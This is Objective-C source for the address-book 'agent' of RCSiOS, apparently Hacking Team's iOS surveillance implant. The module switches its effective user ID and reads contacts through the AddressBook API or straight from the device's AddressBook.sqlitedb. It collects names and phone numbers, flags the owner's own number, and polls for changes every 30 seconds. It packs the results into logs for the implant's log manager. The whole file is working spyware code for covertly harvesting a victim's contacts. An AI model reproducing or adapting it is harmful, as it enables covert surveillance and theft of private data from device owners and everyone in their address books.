/*
 * RCSiOS - messages agent
 *
 *
 * Created by Massimo Chiodini on 12/12/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <AddressBook/AddressBook.h>
#import <unistd.h>
#import <sys/types.h>
#import <pwd.h>

#import "RCSIAgentAddressBook.h"
#import "RCSIUtils.h"

//#define DEBUG

int seteuid(uid_t euid);

NSString *k_i_AgentAddressBookRunLoopMode = @"k_i_AgentAddressBookRunLoopMode";

#define ALL_ADDRESS (NSTimeInterval)0
#define CFRELEASE(x) {if(x!=NULL)CFRelease(x);}

@interface _i_AgentAddressBook (hidden)

- (int)_incSemaphore;
- (int)_decSemaphore;
- (BOOL)_getAgentABProperty;
- (BOOL)_setAgentABProperty;
- (BOOL)_writeABLog: (NSMutableArray *)records;
- (BOOL)_getABWithDateTime: (CFAbsoluteTime)dateTime;

@end

// AB Notification callback
static void  ABNotificationCallback(ABAddressBookRef addressBook,
                                    CFDictionaryRef info,
                                    void *context) 
{  
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  _i_AgentAddressBook *agentAB = (_i_AgentAddressBook *) context;
  
  [agentAB _incSemaphore];
  
  [pool release];

  return; 
}

@implementation _i_AgentAddressBook (hidden)

- (int)_incSemaphore
{
  @synchronized(self)
  {
    if (abChanges == 0)
      abChanges++;
  }
  
  return abChanges;
}

- (int)_decSemaphore
{
  @synchronized(self)
  {
    if (abChanges > 0)
      abChanges--;
  }
  
  return abChanges;
}

- (BOOL)_setAgentABProperty
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSNumber *number = [[NSNumber alloc] initWithDouble: mLastABDateTime];
  NSNumber *myPhoneContact = [[NSNumber alloc] initWithBool: mIsMyContactSaved];
  
  NSDictionary *abDict = [[NSDictionary alloc] initWithObjects: [NSArray arrayWithObjects: number, myPhoneContact, nil]
                                                       forKeys: [NSArray arrayWithObjects: @"AB_LASTMODIFIED", @"AB_MYCONTACT", nil]];

  [[_i_Utils sharedInstance] setPropertyWithName:[[self class] description]
                                  withDictionary:abDict];

  [abDict release];
  [number release];
  [myPhoneContact release];
  
  [pool release];
  
  return YES;
}

- (BOOL)_getAgentABProperty
{
  NSDictionary *agentDict = nil;
  
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];

  agentDict = [[_i_Utils sharedInstance] getPropertyWithName:[[self class] description]];
  
  if (agentDict == nil) 
    {
      mLastABDateTime = 0;
    }
  else 
    {
      mLastABDateTime   = [[agentDict objectForKey: @"AB_LASTMODIFIED"] doubleValue];
      mIsMyContactSaved = [[agentDict objectForKey: @"AB_MYCONTACT"] boolValue];
      
      [agentDict release];
    }

  [outerPool release];
  
  return YES;
}

- (ABAddressBookRef)_getAddressBookRef
{
  int               eUid;
  ABAddressBookRef  addressBook;
  
  eUid = geteuid();
  
  if( seteuid(501) < 0)
    {
      return NULL;  
    }

  addressBook = ABAddressBookCreate();
  
  if( seteuid(eUid) < 0)
    {
      CFRELEASE(addressBook);
      return NULL;
    }
  
  return addressBook;
}

- (BOOL)_writeABLog: (NSMutableArray *)records
{
  NSMutableData *abData = [[NSMutableData alloc] initWithCapacity: 0];
  ABLogStrcut header;
  ABFile      abFile;
  ABContats   abContat;
  ABNumbers   abNumber;
  Names       abNames;
  
  // setting magic
  header.magic    = CONTACTLIST_2;
  abFile.magic    = CONTACTFILE; 
  abContat.magic  = CONTACTCNT;
  abNumber.magic  = CONTACTNUM;
  abNames.magic   = CONTACTNAME;
  
  header.numRecords = [records count];
  header.len        = 0xFFFFFFFF;
  
  // Add header
  [abData appendBytes: (const void *) &header length: sizeof(header)];
  
  for (int i=0; i< [records count]; i++) 
    {
      NSDictionary *rec   = (NSDictionary *) [records objectAtIndex: i];
    
      NSString *firstN    = [rec objectForKey: @"First"];
      NSString *lastN     = [rec objectForKey: @"Last"];
      NSMutableArray *num = [rec objectForKey: @"Numbers"];
      NSString *isMyNumber= [rec objectForKey: @"IsMyNumber"];
      
      // New contact
      abFile.len   = 0;
      
      // if log is Chat bogus contacts flag = 0x80000001
      if (isMyNumber == @"YES")
        abFile.flag = 0x80000000;
      else
        abFile.flag = 0x00000000;
      
      [abData appendBytes: (const void *) &abFile length: sizeof(abFile)];
      
      // FirstName abNames
      abNames.len = [firstN lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
      [abData appendBytes: (const void *) &abNames length: sizeof(abNames)];
      [abData appendBytes: (const void *) [[firstN dataUsingEncoding: NSUTF16LittleEndianStringEncoding] bytes] 
                   length: abNames.len];
      
      // LastName abNames
      abNames.len = [lastN lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
      [abData appendBytes: (const void *) &abNames length: sizeof(abNames)];
      [abData appendBytes: (const void *) [[lastN dataUsingEncoding: NSUTF16LittleEndianStringEncoding] bytes] 
                   length: abNames.len];
      
      // Telephone numbers
      abContat.numContats = [num count];
      [abData appendBytes: (const void *) &abContat length: sizeof(abContat)];
      
      for (int a=0; a < [num count]; a++) 
        {
          NSDictionary *telNum = [num objectAtIndex: a];
          
          abNumber.type = a;
          [abData appendBytes: (const void *) &abNumber length: sizeof(abNumber)];
        
          NSString *number = [telNum objectForKey: @"Number"];
          abNames.len = [number lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
          
          [abData appendBytes: (const void *) &abNames length: sizeof(abNames)];
          [abData appendBytes: (const void *) [[number dataUsingEncoding: NSUTF16LittleEndianStringEncoding] bytes]
                       length: abNames.len];
        }
    }
  
  // Setting len of NSData - sizeof(magic)
  ABLogStrcut *logS = (ABLogStrcut *) [abData bytes];
  logS->len = [abData length] - (sizeof(logS->magic) + sizeof(logS->len));

  _i_LogManager *logManager = [_i_LogManager sharedInstance];
  
  BOOL success = [logManager createLog: LOG_ADDRESSBOOK
                           agentHeader: nil
                             withLogID: 0];

  if (success == TRUE)
    {
      if ([logManager writeDataToLog: abData
                            forAgent: LOG_ADDRESSBOOK
                           withLogID: 0] == TRUE)
        {
          [logManager closeActiveLog: LOG_ADDRESSBOOK withLogID: 0];
        }
    }
  else
    return NO;

  [abData release];
  
  return YES;
}

- (NSMutableString*)strippedPhoneNumber:(NSString*)theNumber
{
  NSMutableString *stripped = [NSMutableString stringWithCapacity:0];
  
  unichar buff[255];
  
  for (int i=0; i<([theNumber lengthOfBytesUsingEncoding: NSUTF8StringEncoding]-sizeof(unichar)); i++)
  {
    NSRange range;
    
    range.length = 1;
    range.location = i;
    
    [theNumber getCharacters:buff range:range];

    if (buff[0] <= '9' && buff[0] >= '0')
    {
      NSString *tmpString = [NSString stringWithCharacters: buff length:1];
      [stripped appendString: tmpString];
    }
  }
  
  return stripped;
}

- (BOOL)isMyPhoneNumber:(NSMutableArray*)theNumbers
{
  BOOL retVal = FALSE;
  
  for (int i=0; i< [theNumbers count]; i++)
  {
    id obj = [theNumbers objectAtIndex:i];
    
    NSString *_num = [obj objectForKey: @"Number"];
    
    if (_num == nil)
      return FALSE;
    
    NSString *num  = [self strippedPhoneNumber: _num];
    
    if (mMyPhoneNumber != nil)
    {
      NSRange range = [mMyPhoneNumber rangeOfString:num] ;
      
      if (range.location != NSNotFound)
      {
        retVal = TRUE;
        break;
      }
    }
  }
  
  return retVal;
}

- (NSMutableArray*)getABNumbers:(ABMutableMultiValueRef)multi
{
  NSMutableArray  *numbers = nil;
  CFStringRef     phoneNumber, phoneNumberLabel;
  NSDictionary    *telNum;
  
  numbers = [[NSMutableArray alloc] initWithCapacity: 0];
  
  for (CFIndex i = 0; i < ABMultiValueGetCount(multi); i++) 
    {
      phoneNumberLabel = ABMultiValueCopyLabelAtIndex(multi, i);
      
      if (phoneNumberLabel == NULL) 
        continue;
    
      phoneNumber = ABMultiValueCopyValueAtIndex(multi, i);
      
      if (phoneNumber == NULL) 
        {
          CFRELEASE(phoneNumberLabel);
          continue;
        }
  
      telNum = [[NSDictionary alloc] initWithObjectsAndKeys: (id)phoneNumberLabel,
                                                             @"Label",
                                                             phoneNumber, 
                                                             @"Number",
                                                             nil];
      
      [numbers addObject: telNum];
      
      [telNum release];
      CFRELEASE(phoneNumberLabel);
      CFRELEASE(phoneNumber);
    }
  
  return numbers;
}

- (ABMutableMultiValueRef)getPhones:(ABRecordRef)person
{
  ABMutableMultiValueRef multi;
  
  multi = ABRecordCopyValue(person, kABPersonPhoneProperty);
  
  if (multi == NULL)
    {
      ABRecordID uid = ABRecordGetRecordID(person);
    
      if (uid == kABRecordInvalidID)
        return multi;
        
      ABAddressBookRef addressBook = [self _getAddressBookRef];
     
      if (addressBook == NULL)
        return multi;
    
      ABRecordRef tmpPerson = ABAddressBookGetPersonWithRecordID(addressBook, uid);
    
      multi = ABRecordCopyValue(tmpPerson, kABPersonPhoneProperty);
    
      CFRelease(addressBook);
    }
  
  return multi;
}

- (NSMutableArray*)getABContacts:(CFArrayRef)people
                    withDateTime:(CFAbsoluteTime)dateTime
{
  static CFStringRef  nullName = CFSTR("");
  
  CFIndex         count;
  CFDateRef       cfDateTime;
  CFAbsoluteTime  currDateTime, lMaxDateTime = dateTime;
  CFStringRef     firstName, lastName;
  NSDictionary    *rec;
  
  ABMutableMultiValueRef  multi;
  
  if ([self isThreadCancelled] == YES)
    return nil;
  
  if ((count = CFArrayGetCount(people)) == 0)
    return nil;
  
  NSMutableArray *abRecords = [[NSMutableArray alloc] initWithCapacity:0];
    
  for (int i=0; i<count; i++) 
    {
      ABRecordRef person = CFArrayGetValueAtIndex(people, i);
      
      if (person != NULL && ABRecordGetRecordType(person) == kABPersonType) 
        {
          firstName     = ABRecordCopyValue(person, kABPersonFirstNameProperty);
          lastName      = ABRecordCopyValue(person, kABPersonLastNameProperty); 
          multi         = [self getPhones:person];
          cfDateTime    = ABRecordCopyValue(person, kABPersonModificationDateProperty);
          
          if (cfDateTime != NULL)
            {
              currDateTime = CFDateGetAbsoluteTime(cfDateTime);
            }
          else 
            { 
              CFRELEASE(firstName);
              CFRELEASE(lastName);
              CFRELEASE(multi);
              continue;
            }
        
          if (((lastName != NULL || firstName != NULL) && multi != NULL)  && 
              (dateTime == ALL_ADDRESS || currDateTime > dateTime))
            {
              if (currDateTime > lMaxDateTime)
                lMaxDateTime = currDateTime;
              
              NSMutableArray *numbers = [self getABNumbers:multi];
              
              NSString *isMyNumber = @"NO";
              
              if ([self isMyPhoneNumber: numbers] == TRUE)
              {
                mIsMyContactSaved = TRUE;
                isMyNumber = @"YES";
              }
              
              NSArray *objects = 
                [NSArray arrayWithObjects:(firstName != NULL ? (id)firstName : (id)nullName), 
                                          (lastName  != NULL ? (id)lastName  : (id)nullName),
                                          numbers,
                                          isMyNumber,
                                          nil];
              
              NSArray *keys = [NSArray arrayWithObjects: @"First", 
                                                         @"Last", 
                                                         @"Numbers",
                                                         @"IsMyNumber",
                                                         nil];
              
              rec = [[NSDictionary alloc] initWithObjects: objects forKeys: keys];
              
              [abRecords addObject: rec];
              
              [numbers release];
              [rec release];
            }
          
          CFRELEASE(firstName);
          CFRELEASE(lastName);
          CFRELEASE(multi);
          CFRelease(cfDateTime);
        }
    }
  
  if (mLastABDateTime < lMaxDateTime) 
    {
      mLastABDateTime = lMaxDateTime;
      [self _setAgentABProperty];
    }
  
  return abRecords;
}

- (BOOL)_getABWithDateTime:(CFAbsoluteTime)dateTime
{
  CFArrayRef        people;
  ABAddressBookRef  addressBook;

  if ([self isThreadCancelled] == YES)
    return NO;

  addressBook = [self _getAddressBookRef];
  
  if (addressBook == NULL) 
    return NO;
  
  if (ABAddressBookHasUnsavedChanges(addressBook) == YES)
      return YES;

  people = ABAddressBookCopyArrayOfAllPeople(addressBook);
  
  CFRELEASE(addressBook);
  
  if (people == NULL || [self isThreadCancelled] == YES) 
      return NO;

  NSMutableArray *abRecords = [self getABContacts:people withDateTime:dateTime];

  if ([abRecords count]) 
    [self _writeABLog: abRecords];
  
  CFRELEASE(people);
  
  [abRecords release];

  return YES;
}

- (NSMutableArray*)getContactNumbers:(NSInteger)theId
{
  long          label;
  char          sql_query_curr[1024];
  int           ret, nrow = 0, ncol = 0;
  char          *szErr;
  char          **result;
  sqlite3       *db;
  char          sql_query_all[] = "select label, value from ABMultiValue ";
  BOOL          bNumFound = FALSE;
  
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSString      *number ;
  NSMutableArray *numArray = [[NSMutableArray alloc] initWithCapacity:0];

  
  sprintf(sql_query_curr, "%s where record_id = %d", sql_query_all, theId);
  
  if (sqlite3_open("/var/mobile/Library/AddressBook/AddressBook.sqlitedb", &db))
  {
    sqlite3_close(db);
    [pool release];
    return numArray;
  }
  ret = sqlite3_get_table(db, sql_query_curr, &result, &nrow, &ncol, &szErr);

  sqlite3_close(db);
  
  if (ret != SQLITE_OK)
  {
    [pool release];
    return numArray;
  }
  
  if (ncol * nrow > 0)
  {
    for (int i = 0; i< nrow * ncol; i += 2)
    {
      if (result[ncol + i] != NULL)
        sscanf(result[ncol + i], "%ld", (long*)&label);
      else
        label = 1;
      
      // 1 = mobile, 2 = iPhone, 3 = home
      if (label == 1)
      {
        if (result[ncol + i + 1] != NULL)
        {
          number = [NSString stringWithUTF8String: result[ncol + i + 1]];
          bNumFound = TRUE;
          break;
        }
      }
    }
    
    // get first phone number if any...
    if (bNumFound == FALSE && result[ncol + 1] != NULL )
      number = [NSString stringWithUTF8String: result[ncol + 1]];
    else
      number = @"unknown";
    
    NSDictionary *dict = [NSDictionary dictionaryWithObject: number forKey: @"Number"];
    
    [numArray addObject: dict];
    
    sqlite3_free_table(result);
  }
  
  [pool release];
  
  return numArray;
}

- (void)getABContacts
{
  long          rowid;
  char          sql_query_curr[1024];
  int           ret, nrow = 0, ncol = 0;
  char          *szErr;
  char          **result;
  sqlite3       *db;
  char          sql_query_all[] = "select rowid,first,last from ABPerson";
  static        CFStringRef  nullName = CFSTR("");
  
  sprintf(sql_query_curr, "%s where rowid > %f", sql_query_all, mLastABDateTime);
  
  if (sqlite3_open("/var/mobile/Library/AddressBook/AddressBook.sqlitedb", &db))
  {
    sqlite3_close(db);
    return;
  }
  // running the query
  ret = sqlite3_get_table(db, sql_query_curr, &result, &nrow, &ncol, &szErr);
  
  // Close as soon as possible
  sqlite3_close(db);
  
  if (ret != SQLITE_OK)
    return;
  
  NSMutableArray *abRecords = [[NSMutableArray alloc] initWithCapacity:0];
  
  // Only if we got some msg...
  if (ncol * nrow > 0)
  {
    for (int i = 0; i< nrow * ncol; i += 3)
    {
      NSAutoreleasePool *inner = [[NSAutoreleasePool alloc] init];
      
      NSString *firstName = @"";
      NSString *lastName  = @"";
      
      sscanf(result[ncol + i], "%ld", (long*)&rowid);
      
      if (result[ncol + i + 1] != NULL)
        firstName = [NSString stringWithUTF8String: result[ncol + i + 1]];
      
      if (result[ncol + i + 2] != NULL)
        lastName  = [NSString stringWithUTF8String: result[ncol + i + 2]];
      
      NSMutableArray *numbers = [self getContactNumbers: rowid];
      
      NSString *isMyNumber = @"NO";
      
      if ([self isMyPhoneNumber: numbers] == TRUE)
      {
        mIsMyContactSaved = TRUE;
        isMyNumber = @"YES";
      }
      
      NSArray *objects =
        [NSArray arrayWithObjects: (firstName != NULL ? (id)firstName : (id)nullName),
                                   (lastName  != NULL ? (id)lastName  : (id)nullName),
                                   numbers,
                                   isMyNumber,
                                   nil];
      
      NSArray *keys = [NSArray arrayWithObjects: @"First",
                                                 @"Last",
                                                 @"Numbers",
                                                 @"IsMyNumber",
                                                 nil];
      
      NSDictionary *rec = [[NSDictionary alloc] initWithObjects: objects forKeys: keys];
      
      [abRecords addObject: rec];
      
      [numbers release];
      [rec release];
      
      [inner release];
    }
    
    sqlite3_free_table(result);
  }
  
  if ([abRecords count])
    [self _writeABLog: abRecords];
  
  [abRecords release];
}

- (void)getABWithDateTime:(NSTimer*)theTimer
{
  if (gOSMajor >= 6)
    [self getABContacts];
  else
    [self _getABWithDateTime: mLastABDateTime];
}

@end

@implementation _i_AgentAddressBook

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

- (id)initWithConfigData:(NSData *)aData
{
  self = [super initWithConfigData: aData];
  
  if (self != nil)
    {
      mMyPhoneNumber = nil;
      mIsMyContactSaved = FALSE;
      mLastABDateTime = 0;
      abChanges = 0;
      mAgentID = AGENT_ADDRESSBOOK;
    }
 
  return self;
}

#pragma mark -
#pragma mark Agent Formal Protocol Methods
#pragma mark -

#define CHANGE_TIME 30

- (void)setABPollingTimeOut:(NSTimeInterval)aTimeOut 
{    
  NSTimer *timer = [NSTimer scheduledTimerWithTimeInterval: aTimeOut 
                                                    target: self 
                                                  selector: @selector(getABWithDateTime:) 
                                                  userInfo: nil 
                                                   repeats: YES];
  
  [[NSRunLoop currentRunLoop] addTimer: timer forMode: k_i_AgentAddressBookRunLoopMode];
}

- (void)startAgent
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  ABAddressBookRef addressBook = NULL;
  
  if ([self isThreadCancelled] == TRUE)
    {
      [self setMAgentStatus: AGENT_STATUS_STOPPED];  
      [outerPool release];
      return;
    }
  
  [self _getAgentABProperty];

  if (mIsMyContactSaved == FALSE)
  {
    mMyPhoneNumber = [[[_i_Utils sharedInstance] getPhoneNumber] retain];
  }
  
  if (gOSMajor >= 6)
  {
    if(mLastABDateTime == ALL_ADDRESS)
      [self getABContacts];
  }
  else
  {
    addressBook = [self _getAddressBookRef];
    
    if (addressBook == NULL) 
      {
        [self setMAgentStatus: AGENT_STATUS_STOPPED];
        [mMyPhoneNumber release];
        [outerPool release];
        return;
      }
   
    if(mLastABDateTime == ALL_ADDRESS)
      [self _getABWithDateTime: ALL_ADDRESS];
  }
  
  [self setABPollingTimeOut: CHANGE_TIME];
  
  while ([self mAgentStatus] == AGENT_STATUS_RUNNING)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
              
      [[NSRunLoop currentRunLoop] runMode: k_i_AgentAddressBookRunLoopMode 
                               beforeDate: [NSDate dateWithTimeIntervalSinceNow: 1.00]];

      [innerPool release];
    }
  
  CFRELEASE(addressBook);
  
  [mMyPhoneNumber release];
  
  mMyPhoneNumber = nil;
  
  [self setMAgentStatus: AGENT_STATUS_STOPPED];
  
  [outerPool release];
}

- (BOOL)stopAgent
{
  [self cancelThread];
  [self setMAgentStatus: AGENT_STATUS_STOPPING];  
  return YES;
}

- (BOOL)resume
{
  return YES;
}

@end
